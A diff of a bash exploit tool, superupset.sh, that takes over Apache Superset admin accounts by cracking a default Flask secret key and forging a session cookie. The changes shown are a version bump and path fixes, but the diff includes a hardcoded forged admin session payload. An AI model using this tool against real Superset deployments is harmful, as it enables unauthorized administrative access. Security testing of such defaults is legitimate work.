@@ -4,8 +4,8 @@
 #Script Name        : superupset.sh
 #Description        : This is a tool focused in exploit the default session configuration of Superset, that is Flask-based, and it dependies of the another tool called flask-unsign (https://github.com/Paradoxis/Flask-Unsign) to prooceed with the cracking SUPERSET_SECRET_KEY and the signing of a valid session cookie after that.
 #Author             : icarot (https://github.com/icarot)
-#updated            : 04/01/2026
-#updated            : 0.8
+#updated            : 06/01/2026
+#updated            : 0.9
 #Dependencies       : Flask-Unsign (https://github.com/Paradoxis/Flask-Unsign), cURL command (https://curl.se/)
 ###########################################
 
@@ -20,17 +20,17 @@ _NOCOLOR="\033[0m";
 #GLOBAL VARIABLES
 _supersetPayload="{'_fresh': True, '_id': 'f6342d140ba68a5c88356844f996e33e23838e895b9b2c5a8fa433b7195482f1de35828446d174cc5aa1781076e62a30ac7bd9740e3aa24fcf7068d9bfe64747', '_user_id': '1', 'csrf_token': 'cc8f99b436f4135c29435cf74293f9ec177935f4', 'locale': 'en'}";
 
-if [[ -e "${PWD}default_SUPERSET_SECRET_KEY.txt" ]]
+if [[ -e "${PWD}/default_SUPERSET_SECRET_KEY.txt" ]]
 then
-    _defaultSupersetSecretKey="${PWD}default_SUPERSET_SECRET_KEY.txt";
+    _defaultSupersetSecretKey="${PWD}/default_SUPERSET_SECRET_KEY.txt";
 fi
 
-if [[ -e "${PWD}template-apache-superset-adminaccounttakeover.yaml" ]]
+if [[ -e "${PWD}/template-apache-superset-adminaccounttakeover.yaml" ]]
 then
-    _templateNuclei="${PWD}template-apache-superset-adminaccounttakeover.yaml";
+    _templateNuclei="${PWD}/template-apache-superset-adminaccounttakeover.yaml";
 fi
 
-_defaultSupersetSecretKeySessionCookie="${PWD}defaultSupersetSecretKeySessionCookie.txt";
+_defaultSupersetSecretKeySessionCookie="${PWD}/defaultSupersetSecretKeySessionCookie.txt";
 
 ###########################################
 #FUNCTIONS
